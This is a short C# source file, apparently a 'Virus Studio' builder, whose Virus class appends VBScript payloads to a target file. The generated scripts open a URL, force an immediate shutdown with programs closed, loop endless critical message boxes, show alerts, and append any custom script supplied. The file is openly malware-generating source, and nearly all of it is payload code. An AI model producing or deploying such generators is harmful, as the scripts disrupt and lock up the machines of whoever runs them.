using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Virus_Studio
{
    class Virus
    {
        public string virusName = String.Empty;

        public void openWebsite(string URL, string filePath)
        {
            string urlScript = "\n" + "Dim wShell" + "\n" + "Set wShell = CreateObject(\"WScript.Shell\")" + "\n" + "wShell.Run \"" + URL + "\"" + ",9";
            File.AppendAllText(filePath, urlScript);
        }

        public void alert(string Message, string filePath)
        {
            string script = "\n" + "msgbox(\" " + Message + "\")";
            File.AppendAllText(filePath, script);
        }

        public void shutdown(string filePath)
        {
            string script = "\n" + "\' -s = shutdown, -t 0 = no timeout, -f = force programs to close" + "\n" + "strShutdown = \"shutdown.exe -s -t 0 -f -m \\\" & strComputer" + "\n" + "set objShell = CreateObject(\"WScript.Shell\")" + "\n" + "objShell.Run strShutdown, 0, false" + "\n";
            File.AppendAllText(filePath, script);
        }

        public void showVirusName(string filePath)
        {
            string script = "\n" + "msgbox(\"" + virusName + "\")";
            File.AppendAllText(filePath, script);
        }

        public void customScript(string filePath, string customScript)
        {
            string script = "\n" + customScript + "\n";
            File.AppendAllText(filePath, customScript);
        }

        public void spamMessage(string filePath, string Message)
        {
            string script = "\n" + "do" + "\n" + "x=MsgBox(\"" + Message + "\"," + "vbOkOnly+vbCritical," + "\"" + Message + "\"" + ")" + "\n" + "loop";
            File.AppendAllText(filePath, script);
        }
    }
}